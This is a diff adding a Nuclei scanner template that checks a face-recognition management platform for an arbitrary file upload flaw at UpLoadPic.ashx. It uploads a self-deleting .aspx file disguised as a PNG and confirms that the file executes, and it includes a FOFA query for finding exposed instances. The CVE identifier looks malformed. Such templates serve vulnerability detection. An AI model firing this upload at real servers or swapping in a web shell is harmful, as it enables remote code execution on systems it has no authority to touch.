@@ -1,0 +1,78 @@
+id: 2024-105241410
+
+info:
+  name: 优卡特脸爱云一脸通智慧平台 UpLoadPic.ashx 任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    脸爱云一脸通智慧管理平台/UpLoadPic.ashx接口处存在任意文件上传，的攻击者可以通过此漏洞上传恶意后门文件，造成信息泄露和远程命令执行。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/138303205?spm=1001.2014.3001.5502
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105241410
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-04-29
+    version: 脸爱云
+    fofa-query: title=="欢迎使用脸爱云 一脸通智慧管理平台"
+  tags: fileupload,rce,脸爱云
+
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "file error"
+  pay1: '<?php echo 11*11;unlink(__FILE__);'
+
+
+http:
+  - raw:
+      - |-
+        POST /UpLoadPic.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywt7cEu1eBdibB13u
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="action"
+        
+        post
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="myPhoto"; filename="1.aspx"
+        Content-Type: image/png
+        
+        <% response.write("hello");System.IO.File.Delete(Request.PhysicalPath); %>
+        ------WebKitFormBoundarywt7cEu1eBdibB13u
+        Content-Disposition: form-data; name="oldName"
+        
+        
+        ------WebKitFormBoundarywt7cEu1eBdibB13u--
+
+      - |
+        GET {{url}} HTTP/1.1
+        Host: {{Hostname}}
+  
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "hello")'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body_1
+        name: url
+        internal: true
+        group: 1
+        regex:
+          - "(/images/.*)"
